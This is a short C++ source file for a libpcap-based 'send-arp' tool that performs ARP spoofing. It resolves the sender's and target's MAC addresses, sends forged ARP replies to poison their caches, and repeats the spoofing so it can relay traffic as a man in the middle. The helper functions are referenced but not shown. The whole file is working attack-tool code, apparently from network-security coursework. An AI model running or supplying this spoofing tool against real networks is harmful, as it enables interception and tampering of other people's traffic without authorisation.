#include "pch.h"

void usage()
{
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    //find mac address from network interface
    char mac_addr[18];
    char ip_addr[16];
    GetAddressFromInterface(dev, mac_addr, ip_addr);

    //find sender_mac address using arp request
    std::vector<Address> addressList;
    for(int i = 2; i < argc; i += 2)
    {
        Address address;
        address.senderIp = Ip(argv[i]);
        address.targetIp = Ip(argv[i+1]);
        address.attackerIp = Ip(ip_addr);
        address.attackerMac = Mac(mac_addr);

        address.senderMac = getMacAddress(pcap, address.attackerMac, address.attackerIp, address.senderIp, mac_addr);
        address.targetMac = getMacAddress(pcap, address.attackerMac, address.attackerIp, address.targetIp, mac_addr);

        addressList.push_back(address);
    }

    //arp spoofing and relay
    for(const auto&address:addressList)
    {
        arpReplyAttack(pcap, address);
    }

    repeatSpoof(pcap, addressList);
}
